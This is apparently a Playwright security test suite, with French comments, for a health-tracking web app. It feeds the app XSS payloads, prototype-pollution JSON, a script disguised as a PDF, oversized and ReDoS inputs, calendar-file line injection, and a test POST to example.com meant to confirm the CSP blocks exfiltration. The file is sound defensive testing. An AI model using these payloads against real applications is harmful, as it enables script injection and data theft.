// Tests de sécurité de Ventre Léger.
// Lancer depuis le dossier de l'app :  node tests/security.test.js
// Nécessite Playwright (préinstallé dans l'environnement de développement).
'use strict';
const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { chromium, devices } = require('playwright');

const ROOT = path.resolve(__dirname, '..');
const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.png': 'image/png', '.webp': 'image/webp', '.webmanifest': 'application/manifest+json' };
const P = '"><img src=x onerror="window.__pwned=(window.__pwned||0)+1"><svg onload="window.__pwned=1">';
const results = [];
const check = (name, ok, detail = '') => { results.push({ name, ok, detail }); console.log(`${ok ? 'OK  ' : 'ÉCHEC'}  ${name}${detail ? ' — ' + detail : ''}`); };

function serve() {
  return new Promise((res) => {
    const srv = http.createServer((req, rsp) => {
      let p = decodeURIComponent(req.url.split('?')[0]);
      if (p.endsWith('/')) p += 'index.html';
      const f = path.join(ROOT, path.normalize(p));
      if (!f.startsWith(ROOT) || !fs.existsSync(f)) { rsp.writeHead(404); return rsp.end(); }
      rsp.writeHead(200, { 'Content-Type': TYPES[path.extname(f)] || 'application/octet-stream' });
      fs.createReadStream(f).pipe(rsp);
    }).listen(0, () => res(srv));
  });
}

// Sauvegarde piégée : une charge XSS dans chaque champ texte ou numérique.
function evilBackup() {
  const day = new Date().toISOString().slice(0, 10);
  const now = Date.now();
  return {
    app: 'ventre-leger',
    data: {
      settings: { name: P, gap: P },
      meals: [{ id: P, ts: now, type: P, items: [P, 'riz'], note: P }],
      symptoms: [{ id: 's' + P, ts: now, bloating: P, pain: P, gas: P, fatigue: P, note: P, flags: [P, 'nausee'] }],
      stools: [{ id: 'st', ts: now, bristol: P, strain: P, blood: P, note: P }],
      treatments: [{ id: 't1', name: P, dose: P, times: [P, '08:00'], start: P, days: P, note: P, mode: P },
                   { id: 't2', name: 'Macrogol' + P, dose: '', times: [], start: day, days: 0, note: '', mode: 'prn' }],
      doses: { ['t1|' + day + '|' + P]: now, [P]: P },
      prn: [{ id: 'p1', tid: 't2', ts: now }, { id: P, tid: P, ts: P }],
      tests: [{ id: 'x1', date: P, substrate: P, lab: P, conclusion: P, points: [{ t: P, h2: P, ch4: P }, { t: 0, h2: 2, ch4: 15 }], pdf: { id: P, name: P, size: P } }],
      weights: [{ id: 'w1', date: P, kg: P }],
      sss: [{ id: 'q1', ts: now, total: P, pain: P, painYes: true, painDays: P, distYes: true, dist: P, unsat: P, impact: P }],
      daily: { [day]: { water: P, sleep: P, calm: P, act: P, period: P }, [P]: { water: 1 } },
      context: { flags: [P, 'ipp'], note: P },
      fodmap: { phase: 'reintro', elimStart: P, ch: { lactose: { start: P, result: P }, [P]: { start: day } } },
      plannedTest: P,
      foodLevels: { riz: P, [P]: 1 },
      demo: P
    },
    files: { [P]: { name: P, type: 'text/html', data: 'data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19wd25lZD0xPC9zY3JpcHQ+' } }
  };
}

async function visitEverything(page) {
  for (const t of ['today', 'journal', 'cure', 'dossier', 'bilan']) {
    await page.click(`[data-tab=${t}]`, { timeout: 2000 }).catch(() => {});
    await page.waitForTimeout(250);
    for (const sel of ['[data-act=edit]', '[data-act=edit-treat]', '[data-act=edit-test]']) {
      const n = await page.locator(sel).count();
      for (let i = 0; i < Math.min(n, 4); i++) {
        await page.locator(sel).nth(i).click({ timeout: 1500 }).catch(() => {});
        await page.waitForTimeout(350);
        await page.click('.sheet [data-act=close]', { timeout: 1500 }).catch(() => {});
        await page.waitForTimeout(300);
      }
    }
  }
}
const pwned = (page) => page.evaluate(() => ({ flag: window.__pwned || 0, imgs: document.querySelectorAll('img[src="x"], svg[onload]').length }));

(async () => {
  const srv = await serve();
  const url = `http://localhost:${srv.address().port}/`;
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'vl-sec-'));
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ ...devices['iPhone 13'] });
  const page = await ctx.newPage();
  const errors = [];
  page.on('pageerror', (e) => errors.push(e.message));
  await page.goto(url);
  await page.waitForTimeout(500);

  // 1. Import d'une sauvegarde piégée
  const evil = path.join(tmp, 'evil.json');
  fs.writeFileSync(evil, JSON.stringify(evilBackup()));
  await page.click('[data-tab=bilan]', { timeout: 2000 }).catch(() => {});
  await page.setInputFiles('#restore-file', evil);
  await page.waitForTimeout(400);
  await page.click('#r-ok', { timeout: 3000 }).catch(() => {});
  await page.waitForTimeout(600);
  await visitEverything(page);
  let r = await pwned(page);
  check('Sauvegarde piégée : aucun script injecté ne s’exécute', r.flag === 0 && r.imgs === 0, JSON.stringify(r));
  check('Sauvegarde piégée : l’app ne plante pas', errors.length === 0, errors.slice(0, 3).join(' | '));
  const keys = await page.evaluate(() => new Promise((res) => { const q = indexedDB.open('ventre-leger-files', 1); q.onupgradeneeded = () => q.result.createObjectStore('files'); q.onsuccess = () => { const t = q.result.transaction('files').objectStore('files').getAllKeys(); t.onsuccess = () => res(t.result); }; }));
  check('Sauvegarde piégée : les fichiers non PDF ou mal nommés sont refusés', keys.length === 0, JSON.stringify(keys));

  // 2. Stockage local modifié à la main
  errors.length = 0;
  await page.evaluate((d) => localStorage.setItem('ventre-leger-v1', JSON.stringify(d)), evilBackup().data);
  await page.reload();
  await page.waitForTimeout(600);
  await visitEverything(page);
  r = await pwned(page);
  check('Stockage local piégé : aucun script injecté ne s’exécute', r.flag === 0 && r.imgs === 0, JSON.stringify(r));
  check('Stockage local piégé : l’app ne plante pas', errors.length === 0, errors.slice(0, 3).join(' | '));

  // 3. Pollution de prototype
  const proto = path.join(tmp, 'proto.json');
  fs.writeFileSync(proto, '{"__proto__":{"polluted":"oui"},"data":{"meals":[],"treatments":[],"__proto__":{"polluted":"oui"},"settings":{"__proto__":{"polluted":"oui"}},"foodLevels":{"__proto__":3}}}');
  await page.click('[data-tab=bilan]', { timeout: 2000 }).catch(() => {});
  await page.setInputFiles('#restore-file', proto);
  await page.waitForTimeout(400);
  await page.click('#r-ok', { timeout: 2000 }).catch(() => {});
  await page.waitForTimeout(400);
  const pol = await page.evaluate(() => ({ obj: ({}).polluted, S: S.polluted, set: S.settings.polluted, fl: Object.getPrototypeOf(S.foodLevels) === Object.prototype || Object.getPrototypeOf(S.foodLevels) === null }));
  check('Pas de pollution de prototype à l’import', pol.obj === undefined && pol.S === undefined && pol.set === undefined && pol.fl, JSON.stringify(pol));

  // 4. Fichier non PDF déposé comme compte rendu
  errors.length = 0;
  await page.evaluate(() => { window.__pwned = 0; document.querySelectorAll('img[src="x"], svg[onload]').forEach((e) => e.remove()); });
  const fake = path.join(tmp, 'faux.pdf');
  fs.writeFileSync(fake, '<script>window.__pwned=1</script> pas un pdf');
  await page.click('[data-tab=dossier]', { timeout: 2000 }).catch(() => {});
  await page.setInputFiles('#test-pdf-file', fake);
  await page.waitForTimeout(2500);
  r = await pwned(page);
  check('Faux PDF : refusé proprement, rien ne s’exécute', r.flag === 0 && errors.length === 0, errors.join(' | '));
  await page.click('.sheet [data-act=close]', { timeout: 1500 }).catch(() => {});
  await page.waitForTimeout(300);

  // 5. Lecture de PDF : texte géant (déni de service par expression régulière)
  const dos = await page.evaluate(() => { const big = 'T1 '.repeat(50000) + 'H2 ' + '1 '.repeat(50000) + 'CH4 ' + '2 '.repeat(50000); const t0 = performance.now(); const p = parseBreath(big); return { ms: Math.round(performance.now() - t0), n: p ? p.times.length : 0 }; });
  check('Lecture de PDF : texte géant traité vite et borné', dos.ms < 1000 && dos.n <= 40, JSON.stringify(dos));

  // 6. pdf.js : exécution de code désactivée (CVE-2024-4367)
  const src = fs.readFileSync(path.join(ROOT, fs.existsSync(path.join(ROOT, 'app.js')) ? 'app.js' : 'index.html'), 'utf8');
  const calls = src.match(/getDocument\(\{[^}]*\}/g) || [];
  check('pdf.js : isEvalSupported:false sur chaque ouverture de PDF', calls.length > 0 && calls.every((c) => /isEvalSupported:\s*false/.test(c)), calls.join(' | '));

  // 7. Politique de sécurité du contenu (CSP)
  const html = fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8');
  const csp = (html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1] || '';
  check('CSP présente, sans unsafe-eval ni script inline', !!csp && !/unsafe-eval/.test(csp) && /script-src 'self'(;|$)/.test(csp) && !/<script>[^<]/.test(html), csp || 'absente');
  const exfil = await page.evaluate(() => new Promise((res) => { let v = 0; document.addEventListener('securitypolicyviolation', (e) => { if (/connect-src|default-src/.test(e.violatedDirective)) v++; }); fetch('https://example.com/collect', { method: 'POST', body: 'x' }).catch(() => {}).finally(() => setTimeout(() => res(v), 300)); }));
  check('CSP : envoi de données vers un site extérieur bloqué par la politique', exfil > 0, `${exfil} violation(s) CSP détectée(s)`);

  // 8. Import trop lourd
  await page.evaluate(() => closeSheet());
  await page.waitForTimeout(400);
  const huge = path.join(tmp, 'enorme.json');
  fs.writeFileSync(huge, '{"data":{"meals":[],"treatments":[],"x":"' + 'a'.repeat(52 * 1024 * 1024) + '"}}');
  await page.click('[data-tab=bilan]', { timeout: 2000 }).catch(() => {});
  await page.setInputFiles('#restore-file', huge);
  await page.waitForTimeout(800);
  const hugeSheet = await page.locator('#r-ok').count();
  const hugeToast = await page.textContent('#toast').catch(() => '');
  check('Import de plus de 50 Mo refusé', hugeSheet === 0 && /trop lourd/.test(hugeToast), `fenêtre d’import ouverte : ${hugeSheet ? 'oui' : 'non'}, message : « ${(hugeToast || '').trim()} »`);
  await page.click('.sheet [data-act=close]', { timeout: 1500 }).catch(() => {});

  // 9. Rappels Calendrier : pas d'injection de lignes dans le fichier .ics
  const ics = await page.evaluate(() => icsFor({ id: 'i', name: 'X\r\nATTENDEE:mailto:pirate@example.com', dose: '1;\nRRULE:FREQ=SECONDLY', times: ['08:00'], start: '2026-01-01', days: 3, note: 'a\r\nb' }).text);
  check('Fichier .ics : retours à la ligne neutralisés', ics.split('\r\n').every((l) => !/[\r\n]/.test(l)) && !/^ATTENDEE|^RRULE:FREQ=SECONDLY/m.test(ics.replace(/\r\n/g, '\n')));

  await browser.close();
  srv.close();
  fs.rmSync(tmp, { recursive: true, force: true });
  const failed = results.filter((x) => !x.ok).length;
  console.log(`\n${results.length - failed}/${results.length} tests réussis`);
  process.exit(failed ? 1 : 0);
})();
